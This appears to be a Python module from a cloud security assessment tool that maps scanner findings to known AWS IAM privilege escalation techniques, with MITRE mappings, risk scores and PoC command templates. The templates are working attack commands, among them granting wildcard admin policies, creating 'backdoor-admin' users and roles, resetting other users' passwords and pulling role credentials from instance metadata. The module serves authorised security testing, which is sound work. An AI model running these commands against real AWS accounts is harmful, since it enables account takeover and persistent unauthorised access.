#!/usr/bin/env python3
"""
Privilege Escalation Path Edge Definitions

Maps IAM configurations and findings to privilege escalation techniques.
Based on documented AWS IAM privilege escalation research including:
- Rhino Security Labs research
- AWS IAM security best practices
- Known privilege escalation chains

Each escalation method defines:
- Required permissions for the source principal
- Target principal or resource that enables escalation
- MITRE ATT&CK mapping
- Risk scoring factors
- PoC commands for validation
"""

import re
from typing import Any

# Principal types that can be sources of privilege escalation
SOURCE_PRINCIPAL_TYPES = {
    "user": "IAM User",
    "role": "IAM Role",
    "group": "IAM Group",
    "lambda": "Lambda Execution Role",
    "ec2": "EC2 Instance Profile",
    "ecs": "ECS Task Role",
    "assumed_role": "Assumed Role Session",
}

# Principal types that are escalation targets
TARGET_PRINCIPAL_TYPES = {
    "admin_user": "Administrative IAM User",
    "admin_role": "Administrative IAM Role",
    "root": "Root Account",
    "service_role": "Privileged Service Role",
    "cross_account_role": "Cross-Account Role",
}

# Escalation method categories
ESCALATION_CATEGORIES = {
    "iam_policy": "IAM Policy Manipulation",
    "role_assumption": "Role Assumption",
    "credential_creation": "Credential Creation",
    "service_abuse": "Service Role Abuse",
    "policy_version": "Policy Version Manipulation",
}

# Privilege escalation method definitions
ESCALATION_METHODS = {
    # ==========================================================================
    # IAM Policy Manipulation Methods
    # ==========================================================================
    "iam_create_policy_version": {
        "name": "Create IAM Policy Version",
        "category": "iam_policy",
        "description": "Create a new version of an IAM policy with elevated permissions and set it as default",
        "required_permissions": ["iam:CreatePolicyVersion"],
        "check_patterns": [
            r"iam.*createpolicyversion",
            r"create.*policy.*version",
        ],
        "finding_patterns": [
            r"iam.*overpermissive",
            r"iam.*privilege.*escalation",
            r"createpolicyversion",
        ],
        "escalation_to": "admin_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 90,
        "mitre_techniques": ["T1098.001"],  # Account Manipulation: Additional Cloud Credentials
        "mitre_tactics": ["TA0004"],  # Privilege Escalation
        "requires_conditions": [],
        "poc_template": """aws iam create-policy-version \\
    --policy-arn {policy_arn} \\
    --policy-document '{{"Version":"2012-10-17","Statement":[{{"Effect":"Allow","Action":"*","Resource":"*"}}]}}' \\
    --set-as-default""",
    },
    "iam_set_default_policy_version": {
        "name": "Set Default IAM Policy Version",
        "category": "policy_version",
        "description": "Change the default version of a managed policy to a more permissive version",
        "required_permissions": ["iam:SetDefaultPolicyVersion"],
        "check_patterns": [
            r"iam.*setdefaultpolicyversion",
            r"set.*default.*policy",
        ],
        "finding_patterns": [
            r"setdefaultpolicyversion",
            r"policy.*version.*manipulation",
        ],
        "escalation_to": "admin_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 85,
        "mitre_techniques": ["T1098"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["existing_permissive_version"],
        "poc_template": """aws iam set-default-policy-version \\
    --policy-arn {policy_arn} \\
    --version-id {version_id}""",
    },
    "iam_attach_user_policy": {
        "name": "Attach Policy to User",
        "category": "iam_policy",
        "description": "Attach an administrator policy to a user",
        "required_permissions": ["iam:AttachUserPolicy"],
        "check_patterns": [
            r"iam.*attachuserpolicy",
            r"attach.*user.*policy",
        ],
        "finding_patterns": [
            r"attachuserpolicy",
            r"iam.*attach.*policy",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 95,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": [],
        "poc_template": """aws iam attach-user-policy \\
    --user-name {user_name} \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess""",
    },
    "iam_attach_role_policy": {
        "name": "Attach Policy to Role",
        "category": "iam_policy",
        "description": "Attach an administrator policy to a role the attacker can assume",
        "required_permissions": ["iam:AttachRolePolicy"],
        "check_patterns": [
            r"iam.*attachrolepolicy",
            r"attach.*role.*policy",
        ],
        "finding_patterns": [
            r"attachrolepolicy",
            r"iam.*attach.*role",
        ],
        "escalation_to": "admin_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 95,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["can_assume_target_role"],
        "poc_template": """aws iam attach-role-policy \\
    --role-name {role_name} \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess""",
    },
    "iam_attach_group_policy": {
        "name": "Attach Policy to Group",
        "category": "iam_policy",
        "description": "Attach an administrator policy to a group the attacker belongs to",
        "required_permissions": ["iam:AttachGroupPolicy"],
        "check_patterns": [
            r"iam.*attachgrouppolicy",
            r"attach.*group.*policy",
        ],
        "finding_patterns": [
            r"attachgrouppolicy",
            r"iam.*group.*policy",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 90,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["member_of_target_group"],
        "poc_template": """aws iam attach-group-policy \\
    --group-name {group_name} \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess""",
    },
    "iam_put_user_policy": {
        "name": "Put Inline User Policy",
        "category": "iam_policy",
        "description": "Add an inline policy with elevated permissions to a user",
        "required_permissions": ["iam:PutUserPolicy"],
        "check_patterns": [
            r"iam.*putuserpolicy",
            r"put.*user.*policy",
        ],
        "finding_patterns": [
            r"putuserpolicy",
            r"iam.*inline.*user",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 95,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": [],
        "poc_template": """aws iam put-user-policy \\
    --user-name {user_name} \\
    --policy-name EscalationPolicy \\
    --policy-document '{{"Version":"2012-10-17","Statement":[{{"Effect":"Allow","Action":"*","Resource":"*"}}]}}'""",
    },
    "iam_put_role_policy": {
        "name": "Put Inline Role Policy",
        "category": "iam_policy",
        "description": "Add an inline policy with elevated permissions to a role",
        "required_permissions": ["iam:PutRolePolicy"],
        "check_patterns": [
            r"iam.*putrolepolicy",
            r"put.*role.*policy",
        ],
        "finding_patterns": [
            r"putrolepolicy",
            r"iam.*inline.*role",
        ],
        "escalation_to": "admin_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 95,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["can_assume_target_role"],
        "poc_template": """aws iam put-role-policy \\
    --role-name {role_name} \\
    --policy-name EscalationPolicy \\
    --policy-document '{{"Version":"2012-10-17","Statement":[{{"Effect":"Allow","Action":"*","Resource":"*"}}]}}'""",
    },
    "iam_put_group_policy": {
        "name": "Put Inline Group Policy",
        "category": "iam_policy",
        "description": "Add an inline policy with elevated permissions to a group",
        "required_permissions": ["iam:PutGroupPolicy"],
        "check_patterns": [
            r"iam.*putgrouppolicy",
            r"put.*group.*policy",
        ],
        "finding_patterns": [
            r"putgrouppolicy",
            r"iam.*inline.*group",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 90,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["member_of_target_group"],
        "poc_template": """aws iam put-group-policy \\
    --group-name {group_name} \\
    --policy-name EscalationPolicy \\
    --policy-document '{{"Version":"2012-10-17","Statement":[{{"Effect":"Allow","Action":"*","Resource":"*"}}]}}'""",
    },
    # ==========================================================================
    # Credential Creation Methods
    # ==========================================================================
    "iam_create_access_key": {
        "name": "Create Access Key",
        "category": "credential_creation",
        "description": "Create access keys for another user with higher privileges",
        "required_permissions": ["iam:CreateAccessKey"],
        "check_patterns": [
            r"iam.*createaccesskey",
            r"create.*access.*key",
        ],
        "finding_patterns": [
            r"createaccesskey",
            r"iam.*access.*key.*creation",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 90,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004", "TA0003"],  # Privilege Escalation, Persistence
        "requires_conditions": ["target_user_is_privileged"],
        "poc_template": """aws iam create-access-key --user-name {target_user}""",
    },
    "iam_create_login_profile": {
        "name": "Create Login Profile",
        "category": "credential_creation",
        "description": "Create console login credentials for a user",
        "required_permissions": ["iam:CreateLoginProfile"],
        "check_patterns": [
            r"iam.*createloginprofile",
            r"create.*login.*profile",
        ],
        "finding_patterns": [
            r"createloginprofile",
            r"iam.*console.*password",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "high",
        "risk_base": 80,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004", "TA0003"],
        "requires_conditions": ["target_user_has_no_password", "target_user_is_privileged"],
        "poc_template": """aws iam create-login-profile \\
    --user-name {target_user} \\
    --password {password} \\
    --no-password-reset-required""",
    },
    "iam_update_login_profile": {
        "name": "Update Login Profile",
        "category": "credential_creation",
        "description": "Change the console password for another user",
        "required_permissions": ["iam:UpdateLoginProfile"],
        "check_patterns": [
            r"iam.*updateloginprofile",
            r"update.*login.*profile",
        ],
        "finding_patterns": [
            r"updateloginprofile",
            r"iam.*password.*change",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "high",
        "risk_base": 85,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["target_user_is_privileged"],
        "poc_template": """aws iam update-login-profile \\
    --user-name {target_user} \\
    --password {new_password} \\
    --no-password-reset-required""",
    },
    # ==========================================================================
    # Role Assumption Methods
    # ==========================================================================
    "sts_assume_role": {
        "name": "Assume Privileged Role",
        "category": "role_assumption",
        "description": "Assume a role with higher privileges",
        "required_permissions": ["sts:AssumeRole"],
        "check_patterns": [
            r"sts.*assumerole",
            r"assume.*role",
        ],
        "finding_patterns": [
            r"assumerole",
            r"role.*trust.*policy",
            r"cross.*account.*access",
        ],
        "escalation_to": "admin_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 85,
        "mitre_techniques": ["T1550.001"],  # Use Alternate Authentication Material
        "mitre_tactics": ["TA0004", "TA0008"],  # Privilege Escalation, Lateral Movement
        "requires_conditions": ["role_trust_allows_assumption"],
        "poc_template": """aws sts assume-role \\
    --role-arn {role_arn} \\
    --role-session-name escalation-test""",
    },
    "iam_update_assume_role_policy": {
        "name": "Update Assume Role Policy",
        "category": "role_assumption",
        "description": "Modify a role's trust policy to allow assumption",
        "required_permissions": ["iam:UpdateAssumeRolePolicy"],
        "check_patterns": [
            r"iam.*updateassumerolepolicy",
            r"update.*assume.*role.*policy",
        ],
        "finding_patterns": [
            r"updateassumerolepolicy",
            r"trust.*policy.*modification",
        ],
        "escalation_to": "admin_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 95,
        "mitre_techniques": ["T1098"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": [],
        "poc_template": """aws iam update-assume-role-policy \\
    --role-name {role_name} \\
    --policy-document '{{"Version":"2012-10-17","Statement":[{{"Effect":"Allow","Principal":{{"AWS":"{attacker_arn}"}},"Action":"sts:AssumeRole"}}]}}'""",
    },
    # ==========================================================================
    # Service Role Abuse Methods
    # ==========================================================================
    "iam_pass_role_lambda": {
        "name": "PassRole to Lambda",
        "category": "service_abuse",
        "description": "Create/update Lambda with a privileged role and invoke it",
        "required_permissions": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
        "check_patterns": [
            r"iam.*passrole",
            r"lambda.*create.*function",
        ],
        "finding_patterns": [
            r"passrole",
            r"lambda.*execution.*role",
            r"lambda.*privilege",
        ],
        "escalation_to": "service_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 90,
        "mitre_techniques": ["T1098", "T1648"],
        "mitre_tactics": ["TA0004", "TA0002"],
        "requires_conditions": ["privileged_role_passable"],
        "poc_template": """# Create Lambda with privileged role
aws lambda create-function \\
    --function-name escalation-function \\
    --runtime python3.9 \\
    --role {privileged_role_arn} \\
    --handler index.handler \\
    --zip-file fileb://function.zip

# Invoke to execute with role permissions
aws lambda invoke --function-name escalation-function output.json""",
    },
    "iam_pass_role_ec2": {
        "name": "PassRole to EC2",
        "category": "service_abuse",
        "description": "Launch EC2 with a privileged instance profile and access IMDS",
        "required_permissions": ["iam:PassRole", "ec2:RunInstances"],
        "check_patterns": [
            r"iam.*passrole",
            r"ec2.*runinstances",
        ],
        "finding_patterns": [
            r"passrole",
            r"instance.*profile",
            r"ec2.*role",
        ],
        "escalation_to": "service_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 85,
        "mitre_techniques": ["T1098", "T1552.005"],
        "mitre_tactics": ["TA0004", "TA0006"],
        "requires_conditions": ["privileged_role_passable"],
        "poc_template": """aws ec2 run-instances \\
    --image-id {ami_id} \\
    --instance-type t3.micro \\
    --iam-instance-profile Name={instance_profile_name}

# Then SSH to instance and:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}""",
    },
    "iam_pass_role_cloudformation": {
        "name": "PassRole to CloudFormation",
        "category": "service_abuse",
        "description": "Create CloudFormation stack with a privileged role",
        "required_permissions": ["iam:PassRole", "cloudformation:CreateStack"],
        "check_patterns": [
            r"iam.*passrole",
            r"cloudformation.*createstack",
        ],
        "finding_patterns": [
            r"passrole",
            r"cloudformation.*role",
        ],
        "escalation_to": "service_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 90,
        "mitre_techniques": ["T1098"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["privileged_role_passable"],
        "poc_template": """aws cloudformation create-stack \\
    --stack-name escalation-stack \\
    --template-body file://malicious-template.yaml \\
    --role-arn {privileged_role_arn} \\
    --capabilities CAPABILITY_IAM""",
    },
    "iam_pass_role_glue": {
        "name": "PassRole to Glue",
        "category": "service_abuse",
        "description": "Create Glue job with a privileged role",
        "required_permissions": ["iam:PassRole", "glue:CreateJob", "glue:StartJobRun"],
        "check_patterns": [
            r"iam.*passrole",
            r"glue.*createjob",
        ],
        "finding_patterns": [
            r"passrole",
            r"glue.*role",
        ],
        "escalation_to": "service_role",
        "exploitability": "confirmed",
        "impact": "high",
        "risk_base": 80,
        "mitre_techniques": ["T1098"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["privileged_role_passable"],
        "poc_template": """aws glue create-job \\
    --name escalation-job \\
    --role {privileged_role_arn} \\
    --command Name=glueetl,ScriptLocation=s3://bucket/script.py

aws glue start-job-run --job-name escalation-job""",
    },
    "iam_pass_role_codebuild": {
        "name": "PassRole to CodeBuild",
        "category": "service_abuse",
        "description": "Create CodeBuild project with a privileged role",
        "required_permissions": ["iam:PassRole", "codebuild:CreateProject", "codebuild:StartBuild"],
        "check_patterns": [
            r"iam.*passrole",
            r"codebuild.*createproject",
        ],
        "finding_patterns": [
            r"passrole",
            r"codebuild.*role",
        ],
        "escalation_to": "service_role",
        "exploitability": "confirmed",
        "impact": "high",
        "risk_base": 80,
        "mitre_techniques": ["T1098"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["privileged_role_passable"],
        "poc_template": """aws codebuild create-project \\
    --name escalation-project \\
    --service-role {privileged_role_arn} \\
    --source type=NO_SOURCE,buildspec="version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws sts get-caller-identity"
    --artifacts type=NO_ARTIFACTS \\
    --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:5.0

aws codebuild start-build --project-name escalation-project""",
    },
    "iam_pass_role_sagemaker": {
        "name": "PassRole to SageMaker",
        "category": "service_abuse",
        "description": "Create SageMaker notebook with a privileged role",
        "required_permissions": ["iam:PassRole", "sagemaker:CreateNotebookInstance"],
        "check_patterns": [
            r"iam.*passrole",
            r"sagemaker.*createnotebook",
        ],
        "finding_patterns": [
            r"passrole",
            r"sagemaker.*role",
        ],
        "escalation_to": "service_role",
        "exploitability": "confirmed",
        "impact": "high",
        "risk_base": 75,
        "mitre_techniques": ["T1098"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["privileged_role_passable"],
        "poc_template": """aws sagemaker create-notebook-instance \\
    --notebook-instance-name escalation-notebook \\
    --instance-type ml.t3.medium \\
    --role-arn {privileged_role_arn}""",
    },
    # ==========================================================================
    # User/Role Creation Methods
    # ==========================================================================
    "iam_create_user": {
        "name": "Create New IAM User",
        "category": "credential_creation",
        "description": "Create a new IAM user and attach admin privileges",
        "required_permissions": ["iam:CreateUser", "iam:AttachUserPolicy"],
        "check_patterns": [
            r"iam.*createuser",
            r"create.*iam.*user",
        ],
        "finding_patterns": [
            r"createuser",
            r"iam.*user.*creation",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 95,
        "mitre_techniques": ["T1136.003"],  # Create Account: Cloud Account
        "mitre_tactics": ["TA0003", "TA0004"],  # Persistence, Privilege Escalation
        "requires_conditions": [],
        "poc_template": """aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-admin""",
    },
    "iam_create_role": {
        "name": "Create New IAM Role",
        "category": "role_assumption",
        "description": "Create a new IAM role with admin privileges",
        "required_permissions": ["iam:CreateRole", "iam:AttachRolePolicy"],
        "check_patterns": [
            r"iam.*createrole",
            r"create.*iam.*role",
        ],
        "finding_patterns": [
            r"createrole",
            r"iam.*role.*creation",
        ],
        "escalation_to": "admin_role",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 95,
        "mitre_techniques": ["T1098"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": [],
        "poc_template": """aws iam create-role \\
    --role-name backdoor-admin-role \\
    --assume-role-policy-document '{{"Version":"2012-10-17","Statement":[{{"Effect":"Allow","Principal":{{"AWS":"{attacker_arn}"}},"Action":"sts:AssumeRole"}}]}}'

aws iam attach-role-policy --role-name backdoor-admin-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess""",
    },
    "iam_add_user_to_group": {
        "name": "Add User to Privileged Group",
        "category": "iam_policy",
        "description": "Add a user to an administrator group",
        "required_permissions": ["iam:AddUserToGroup"],
        "check_patterns": [
            r"iam.*addusertogroup",
            r"add.*user.*group",
        ],
        "finding_patterns": [
            r"addusertogroup",
            r"iam.*group.*membership",
        ],
        "escalation_to": "admin_user",
        "exploitability": "confirmed",
        "impact": "critical",
        "risk_base": 90,
        "mitre_techniques": ["T1098.001"],
        "mitre_tactics": ["TA0004"],
        "requires_conditions": ["admin_group_exists"],
        "poc_template": """aws iam add-user-to-group --user-name {user_name} --group-name Administrators""",
    },
    # ==========================================================================
    # SSM and Secrets Manager Methods
    # ==========================================================================
    "ssm_send_command": {
        "name": "SSM Send Command",
        "category": "service_abuse",
        "description": "Execute commands on EC2 instances with privileged roles via SSM",
        "required_permissions": ["ssm:SendCommand"],
        "check_patterns": [
            r"ssm.*sendcommand",
            r"send.*command",
        ],
        "finding_patterns": [
            r"ssm.*command",
            r"systems.*manager",
        ],
        "escalation_to": "service_role",
        "exploitability": "confirmed",
        "impact": "high",
        "risk_base": 80,
        "mitre_techniques": ["T1059.004"],  # Command and Scripting Interpreter
        "mitre_tactics": ["TA0002", "TA0004"],
        "requires_conditions": ["target_instance_has_privileged_role"],
        "poc_template": """aws ssm send-command \\
    --instance-ids {instance_id} \\
    --document-name "AWS-RunShellScript" \\
    --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'""",
    },
    "secretsmanager_get_secret": {
        "name": "Get Secret Value",
        "category": "credential_creation",
        "description": "Retrieve secrets that may contain privileged credentials",
        "required_permissions": ["secretsmanager:GetSecretValue"],
        "check_patterns": [
            r"secretsmanager.*getsecretvalue",
            r"get.*secret.*value",
        ],
        "finding_patterns": [
            r"secretsmanager",
            r"secret.*exposed",
        ],
        "escalation_to": "admin_user",
        "exploitability": "likely",
        "impact": "high",
        "risk_base": 70,
        "mitre_techniques": ["T1552.004"],  # Credentials from Password Stores
        "mitre_tactics": ["TA0006"],  # Credential Access
        "requires_conditions": ["secret_contains_credentials"],
        "poc_template": """aws secretsmanager get-secret-value --secret-id {secret_name}""",
    },
}


def find_matching_escalation_methods(finding: dict) -> list[dict]:
    """
    Match a finding against escalation method definitions.

    Args:
        finding: Security finding dict with keys like finding_id, title, description, metadata

    Returns:
        List of matching escalation methods with match details
    """
    matches = []
    finding_text = _get_finding_text(finding)

    for method_id, method_def in ESCALATION_METHODS.items():
        # Check finding patterns
        for pattern in method_def.get("finding_patterns", []):
            if re.search(pattern, finding_text, re.IGNORECASE):
                matches.append({
                    "method_id": method_id,
                    "method_def": method_def,
                    "matched_pattern": pattern,
                    "finding": finding,
                })
                break  # One match per method is enough

    return matches


def _get_finding_text(finding: dict) -> str:
    """Extract searchable text from a finding."""
    parts = [
        str(finding.get("finding_id", "")),
        str(finding.get("title", "")),
        str(finding.get("description", "")),
        str(finding.get("resource_type", "")),
    ]

    # Include metadata if present
    metadata = finding.get("metadata", {})
    if isinstance(metadata, dict):
        parts.append(str(metadata.get("check_id", "")))
        parts.append(str(metadata.get("policy_name", "")))
        parts.append(str(metadata.get("action", "")))
        parts.append(str(metadata.get("permissions", "")))

    return " ".join(parts).lower()


def generate_poc_command(method_id: str, context: dict[str, Any]) -> str | None:
    """
    Generate a PoC command from the template with context substitution.

    Args:
        method_id: The escalation method ID
        context: Dict with values like role_arn, user_name, etc.

    Returns:
        Formatted PoC command string or None
    """
    method_def = ESCALATION_METHODS.get(method_id)
    if not method_def:
        return None

    template = method_def.get("poc_template")
    if not template:
        return None

    try:
        # Safe format with defaults for missing keys
        return template.format_map(SafeDict(context))
    except Exception:
        return template


class SafeDict(dict):
    """Dict that returns placeholder for missing keys in string formatting."""

    def __missing__(self, key: str) -> str:
        return f"{{{key}}}"


def get_escalation_method_info(method_id: str) -> dict | None:
    """Get full info about an escalation method."""
    return ESCALATION_METHODS.get(method_id)


def list_escalation_methods() -> list[str]:
    """List all escalation method IDs."""
    return list(ESCALATION_METHODS.keys())


def get_methods_by_category(category: str) -> list[dict]:
    """Get all escalation methods in a category."""
    return [
        {"id": method_id, **method_def}
        for method_id, method_def in ESCALATION_METHODS.items()
        if method_def.get("category") == category
    ]
